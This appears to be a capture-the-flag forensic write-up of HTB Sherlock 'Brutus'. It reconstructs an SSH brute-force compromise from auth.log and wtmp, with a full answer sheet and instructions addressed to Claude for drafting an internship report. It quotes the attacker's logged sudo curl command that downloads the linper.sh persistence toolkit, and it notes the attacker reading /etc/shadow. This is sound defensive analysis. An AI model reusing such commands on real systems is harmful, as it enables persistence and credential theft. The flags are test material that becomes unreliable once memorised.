# HTB Sherlock — Brutus
## Task 5 Internship Investigation Write-Up

> **Purpose:** This Markdown file is structured so it can be given to Claude together with the renamed screenshot ZIP.  
> Claude should use the exact screenshot filenames referenced below when generating the final internship report.  
> **Do not fabricate evidence, commands, screenshots, or results.**

---

# 1. Investigation Overview

## Scenario

The Brutus Sherlock investigation involved analyzing authentication and login-history artifacts to reconstruct an SSH-based compromise.

### Primary artifacts

- `auth.log` — SSH authentication, session, account-management, and sudo activity.
- `wtmp` — binary login/session history artifact.

### Main tools used

- `grep`
- `utmpdump_linux_amd64`
- `less`
- `wtmp` / TSV output
- MITRE ATT&CK mapping

### Key investigation flow

```text
Brute-force attempts
        ↓
Attacker IP identified
        ↓
Successful root authentication
        ↓
Manual root terminal session established
        ↓
Session 37 identified
        ↓
New account cyberjunkie created
        ↓
cyberjunkie added to sudo
        ↓
Root session ended
        ↓
cyberjunkie logged in
        ↓
sudo used to inspect /etc/shadow
        ↓
linper.sh downloaded with curl
```

---

# 2. Task 1 — Attacker IP

## Question

**Identify the IP address responsible for the brute-force attack.**

## Investigation method

We started with the `auth.log` artifact because it contains SSH authentication activity.

The failed SSH authentication attempts were searched using:

```bash
grep "Failed password" /home/karna/Pictures/loki/auth.log
```

The failed attempts showed the same source IP repeatedly appearing across multiple usernames.

The repeated source IP was:

```text
65.2.161.68
```

The same IP was then observed during the later successful `root` authentication, linking the address to the attacker activity.

## Flag / Answer

```text
65.2.161.68
```

## Evidence

The `auth.log` contains numerous failed authentication attempts from `65.2.161.68`, followed by successful root authentication from the same address.

## Screenshot placement

**Screenshot:**

`Task1_Brute_Force_Attacker_IP.png`

**Suggested figure caption:**

> **Figure 1.** Repeated failed SSH authentication attempts showing the attacker source IP `65.2.161.68`.

**Optional supporting screenshot:**

`Task1_Attacker_IP_AuthLog_Correlation.png`

**Suggested caption:**

> **Figure 2.** Authentication-log correlation linking `65.2.161.68` to the successful root authentication.

---

# 3. Task 2 — Compromised Username

## Question

**The brute-force attempts were successful and the attacker gained access to an account on the server. What is the username of the account?**

## Command used

```bash
grep -E '65\.2\.161\.68|cyberjunkie' /home/karna/Pictures/loki/auth.log
```

## Investigation

The authentication log was searched for activity associated with the identified attacker IP:

```text
65.2.161.68
```

Among the many failed authentication attempts, the following successful event was found:

```text
Mar  6 06:31:40 ... sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```

This shows that authentication succeeded for the `root` account.

## Flag / Answer

```text
root
```

## Investigation conclusion

The `auth.log` file showed numerous failed authentication attempts against multiple usernames. At `06:31:40`, an `Accepted password` event confirmed successful authentication for the `root` account from `65.2.161.68`.

Therefore, the compromised username was:

```text
root
```

## Screenshot placement

**Screenshot:**

`Task2_Successful_Root_Login.png`

**Suggested figure caption:**

> **Figure 3.** Successful SSH authentication for the `root` account from the identified attacker IP.

---

# 4. Task 3 — Manual Login Timestamp

## Question

**Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session. The login time will be different than the authentication time, and can be found in the `wtmp` artifact.**

## Why wtmp was used

The question specifically requires the terminal-session login time rather than the authentication timestamp recorded in `auth.log`.

The supplied `wtmp` artifact is binary, so it was parsed using the downloaded `utmpdump` utility.

## Command used

```bash
./utmpdump_linux_amd64 -f /home/karna/Pictures/loki/wtmp -o tsv > wtmp.tsv
```

The resulting TSV file was inspected using:

```bash
less -S wtmp.tsv
```

## Evidence found

The March 6 records included:

```text
7    2549    pts/1    root    65.2.161.68    ...
Wed, 06 Mar 2024 12:02:45 IST
```

The relevant session details were:

```text
User:     root
Source:   65.2.161.68
Terminal: pts/1
Time:     12:02:45 IST
Date:     06 March 2024
```

HTB asks for UTC.

```text
IST = UTC + 05:30
```

Therefore:

```text
12:02:45 IST
→ 06:32:45 UTC
```

## Flag / Answer

```text
2024-03-06 06:32:45
```

## Investigation conclusion

The binary `wtmp` artifact was parsed using `utmpdump` and exported to TSV format. The records showed a root terminal session from `65.2.161.68` on `pts/1` at `12:02:45 IST` on March 6, 2024. Converting the timestamp from IST to UTC produced:

```text
2024-03-06 06:32:45 UTC
```

## Screenshot placement

**Primary screenshot:**

`Task3_WTMP_Root_Session.png`

**Suggested figure caption:**

> **Figure 4.** Parsed `wtmp` record showing the attacker's root terminal session from `65.2.161.68` on `pts/1` at 12:02:45 IST.

**Supporting screenshot, if useful:**

`WTMP_Full_Output.png`

**Suggested caption:**

> **Figure 5.** Parsed `wtmp` output used to identify the attacker's login-session record.

---

# 5. Task 4 — SSH Session Number

## Question

**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**

Question 2 identified the compromised account as:

```text
root
```

## Command used

```bash
grep -E '06:32:44|New session' /home/karna/Pictures/loki/auth.log
```

## Evidence found

The relevant log sequence contains:

```text
Mar  6 06:32:44 ... Accepted password for root from 65.2.161.68
Mar  6 06:32:44 ... session opened for user root
Mar  6 06:32:44 ... New session 37 of user root
```

The important line is:

```text
New session 37 of user root
```

## Flag / Answer

```text
37
```

## Investigation conclusion

After identifying `root` as the compromised account, the authentication log was searched around the successful root authentication timestamp. The `systemd-logind` entry reported:

```text
New session 37 of user root
```

This establishes that session `37` was assigned to the attacker's root login.

## Screenshot placement

**Screenshot:**

`Task4_Session_37_Creation.png`

**Suggested figure caption:**

> **Figure 6.** `systemd-logind` records the creation of session 37 for the root account.

---

# 6. Task 5 — Persistence Account

## Question

**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**

## Commands used

Initial investigation:

```bash
grep -E '65\.2\.161\.68|cyberjunkie' /home/karna/Pictures/loki/auth.log
```

For a cleaner screenshot specifically showing account creation and privilege changes:

```bash
grep -E 'groupadd|useradd|passwd|usermod' /home/karna/Pictures/loki/auth.log
```

## Evidence found

The log shows:

```text
Mar  6 06:34:18 ... new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ... new user: name=cyberjunkie, UID=1002
Mar  6 06:34:26 ... password changed for cyberjunkie
Mar  6 06:35:15 ... add 'cyberjunkie' to group 'sudo'
```

This establishes the sequence:

```text
Account created
      ↓
Password configured
      ↓
Added to sudo group
      ↓
Higher privileges obtained
```

The later SSH authentication also confirms that the account was used:

```text
Mar  6 06:37:34 ... Accepted password for cyberjunkie from 65.2.161.68
```

## Flag / Answer

```text
cyberjunkie
```

## Investigation conclusion

The authentication log was searched for account-management events following the attacker's successful root access.

At `06:34:18`, the attacker created a new account named `cyberjunkie`.

A password was configured for the account, and at `06:35:15` the account was added to the `sudo` group, giving it elevated privileges.

The account subsequently authenticated from the attacker's IP, confirming its use as a persistence mechanism.

## Screenshot placement

**Primary screenshot:**

`Task5_Cyberjunkie_Creation.png`

**Suggested figure caption:**

> **Figure 7.** Authentication-log evidence showing creation of the `cyberjunkie` account and subsequent account-management activity.

**Supporting screenshot:**

`Task5_Cyberjunkie_Sudo_Privileges.png`

**Suggested caption:**

> **Figure 8.** Evidence showing `cyberjunkie` being added to the `sudo` group.

---

# 7. Task 6 — MITRE ATT&CK Sub-Technique

## Question

**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

## Investigation

Task 5 established that the attacker created the local account:

```text
cyberjunkie
```

and subsequently added it to the `sudo` group.

MITRE ATT&CK maps the behavior of creating a local account for maintaining access to:

```text
T1136.001
```

The technique is:

```text
Create Account: Local Account
```

## Evidence command

```bash
grep -E 'useradd|groupadd|usermod' /home/karna/Pictures/loki/auth.log
```

This provides the artifact evidence showing the account creation and privilege modification.

## Flag / Answer

```text
T1136.001
```

## Investigation conclusion

The authentication log demonstrated that the attacker created the local account `cyberjunkie` and subsequently modified its privileges. This persistence behavior corresponds to MITRE ATT&CK **Create Account: Local Account**, sub-technique:

```text
T1136.001
```

## Screenshot placement

**Screenshot:**

`Task5_Cyberjunkie_Sudo_Privileges.png`

**Suggested figure caption:**

> **Figure 9.** Account-management events showing creation and privilege modification of the `cyberjunkie` local account.

> **Note:** The MITRE ID itself is a framework mapping and is not expected to appear literally inside `auth.log`. The log provides the behavioral evidence; the ATT&CK framework provides the technique/sub-technique mapping.

---

# 8. Task 7 — First SSH Session End Time

## Question

**What time did the attacker's first SSH session end according to `auth.log`?**

## Investigation

The relevant interactive root session is session `37`, identified in Task 4.

The authentication log was searched for the session closure:

```bash
grep -E 'session 37|Session 37|Disconnected from user root|session closed for user root' /home/karna/Pictures/loki/auth.log
```

## Evidence found

The relevant events occurred at:

```text
Mar  6 06:37:24 ... sshd[2491]: Received disconnect from 65.2.161.68 ...
Mar  6 06:37:24 ... sshd[2491]: Disconnected from user root 65.2.161.68 ...
Mar  6 06:37:24 ... pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ... Session 37 logged out
Mar  6 06:37:24 ... Removed session 37
```

## Important distinction

There is also an earlier successful root authentication at:

```text
06:31:40
```

That was a brief successful authentication/session event.

The manually established interactive root session associated with the investigation was session `37`, which began around `06:32:44` and ended at:

```text
06:37:24
```

Therefore, the expected answer for Task 7 is:

## Flag / Answer

```text
2024-03-06 06:37:24
```

## Screenshot placement

**Screenshot:**

`Task7_Session_37_Closure.png`

**Suggested figure caption:**

> **Figure 10.** Authentication-log evidence showing the closure and logout of the attacker's root session 37 at 06:37:24.

---

# 9. Task 8 — Sudo Download Command

## Question

**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

## Command used

```bash
grep 'sudo: cyberjunkie' /home/karna/Pictures/loki/auth.log
```

## Evidence found

The authentication log recorded:

```text
Mar  6 06:39:38 ... sudo: cyberjunkie ... COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The command executed using `sudo` was:

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

## Flag / Answer

```text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

## Investigation conclusion

After the `cyberjunkie` backdoor account authenticated, the account used `sudo` to execute `curl` and download `linper.sh` from GitHub.

## Screenshot placement

**Screenshot:**

`Task8_Sudo_Curl_Command.png`

**Suggested figure caption:**

> **Figure 11.** Sudo audit evidence showing `cyberjunkie` executing `curl` to download `linper.sh`.

---

# 10. Final Answer Sheet

| Task | Finding / Answer |
|---|---|
| Task 1 | `65.2.161.68` |
| Task 2 | `root` |
| Task 3 | `2024-03-06 06:32:45` |
| Task 4 | `37` |
| Task 5 | `cyberjunkie` |
| Task 6 | `T1136.001` |
| Task 7 | `2024-03-06 06:37:24` |
| Task 8 | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

# 11. Investigation Timeline

The following timeline consolidates the evidence identified during the investigation.

| Time | Event | Artifact |
|---|---|---|
| 06:31:31 | Brute-force activity begins from `65.2.161.68` | `auth.log` |
| 06:31:40 | Successful root authentication / brief session | `auth.log` |
| 06:32:44 | Root authentication and session 37 creation | `auth.log` |
| 06:32:45 UTC | Root terminal session recorded in `wtmp` | `wtmp` |
| 06:34:18 | `cyberjunkie` account/group created | `auth.log` |
| 06:34:26 | Password configured for `cyberjunkie` | `auth.log` |
| 06:35:15 | `cyberjunkie` added to `sudo` | `auth.log` |
| 06:37:24 | Root session 37 closes | `auth.log` |
| 06:37:34 | `cyberjunkie` successfully logs in | `auth.log` |
| 06:37:57 | `cyberjunkie` uses sudo to read `/etc/shadow` | `auth.log` |
| 06:39:38 | `cyberjunkie` uses sudo/curl to download `linper.sh` | `auth.log` |

---

# 12. Evidence-to-Question Mapping

| Evidence file | Used for |
|---|---|
| `Task1_Brute_Force_Attacker_IP.png` | Task 1 |
| `Task1_Attacker_IP_AuthLog_Correlation.png` | Task 1 supporting evidence |
| `Task2_Successful_Root_Login.png` | Task 2 |
| `Task3_WTMP_Root_Session.png` | Task 3 |
| `WTMP_Full_Output.png` | Task 3 supporting evidence |
| `Task4_Session_37_Creation.png` | Task 4 |
| `Task5_Cyberjunkie_Creation.png` | Task 5 |
| `Task5_Cyberjunkie_Sudo_Privileges.png` | Task 5 and Task 6 |
| `Task7_Session_37_Closure.png` | Task 7 |
| `Task8_Sudo_Curl_Command.png` | Task 8 |
| `WTMP_Parsing_Tool_Investigation.png` | Supporting methodology/evidence for wtmp parsing |

---

# 13. Report Image Placement Instructions

When generating the final report:

1. Place each primary screenshot immediately after the investigation explanation for the corresponding task.
2. Use the exact filenames from the evidence ZIP.
3. Do not rename screenshots again.
4. Do not invent screenshots that are not present in the ZIP.
5. Do not claim a screenshot proves something that is not visible in that screenshot.
6. Use the suggested figure captions above where appropriate.
7. Supporting screenshots may be placed immediately after the primary screenshot or in an evidence appendix.
8. Keep terminal screenshots readable; do not crop out the command/output needed to establish the finding.
9. The final report should distinguish:
   - artifact evidence,
   - derived conclusions,
   - MITRE ATT&CK mapping,
   - and timestamp conversion.
10. Preserve the exact answers in the Final Answer Sheet.

---

# 14. Investigation Conclusion

The investigation reconstructed an SSH compromise originating from `65.2.161.68`.

The attacker performed repeated SSH authentication attempts and successfully authenticated as `root`. A subsequent interactive root session was recorded in `wtmp` and associated with session `37`.

After obtaining root access, the attacker created the local account `cyberjunkie`, configured its password, and added it to the `sudo` group. This provided a persistent privileged account.

The root session subsequently ended, after which `cyberjunkie` authenticated from the same attacker IP. The account then used `sudo` to access `/etc/shadow` and later executed `curl` to download `linper.sh`.

The account-creation persistence behavior maps to MITRE ATT&CK **T1136.001 — Create Account: Local Account**.

---

# 15. Report Generation Requirements

The final internship report should be professional and evidence-driven.

## Recommended report structure

1. Cover Page
2. Executive Summary
3. Investigation Objective
4. Scenario Overview
5. Artifacts Analyzed
6. Tools Used
7. Investigation Methodology
8. Task-by-Task Investigation
9. Evidence and Screenshots
10. Attack Timeline
11. MITRE ATT&CK Mapping
12. Key Findings
13. Investigation Conclusion
14. Lessons Learned
15. Limitations
16. Appendix — Evidence Screenshots

## Writing requirements

- Use professional cybersecurity/SOC terminology.
- Explain **how** each finding was obtained rather than only listing answers.
- Include the relevant command where useful.
- Include the corresponding screenshot near the finding it supports.
- Do not fabricate any evidence.
- Do not invent additional investigation steps.
- Do not state that a tool was used if it was not used.
- Preserve the exact timestamps and answers documented above.
- Treat `auth.log` and `wtmp` as the primary evidence sources.
